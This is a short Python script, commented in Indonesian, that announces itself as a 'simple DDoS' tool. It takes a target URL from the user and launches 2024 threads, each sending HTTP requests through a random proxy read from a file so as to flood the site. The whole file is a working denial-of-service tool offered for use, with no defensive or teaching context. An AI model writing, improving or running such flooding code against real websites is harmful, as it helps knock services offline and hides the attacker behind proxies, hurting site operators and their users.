import requests
import random
import threading

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print(bcolors.OKCYAN + "ＤＤＯＳ ＳＥＤＥＲＨＡＮＡ ＢＹ ＮＡＸＹＺＺ")
url = input("Silahkan Masukan Url: ")

target_url= url  # URL target yang akan diserang
proxy_list_file = 'proxies.txt'  # Nama file yang berisi daftar proxy

def flood_with_proxy(proxy_url):
    try:
        proxy = {'http': f'http://{proxy_url}'}
        response = requests.get(target_url, proxies=proxy)
        print(f"{bcolors.OKGREEN}Membanjiri {url} melalui proxy {proxy_url}. Status: {response.status_code}")
    except Exception as e:
        print(bcolors.FAIL + "WEBSITE MUNGKIN DOWN!")

def start_flood():
    with open(proxy_list_file, 'r') as file:
        proxy_list = file.read().splitlines()
    flood_threads = []
    
    for _ in range(2024):  # Jumlah thread flood
        proxy_url = random.choice(proxy_list)
        thread = threading.Thread(target=flood_with_proxy, args=(proxy_url,))
        thread.start()
        flood_threads.append(thread)
        
    for thread in flood_threads:
        thread.join()
        
start_flood()
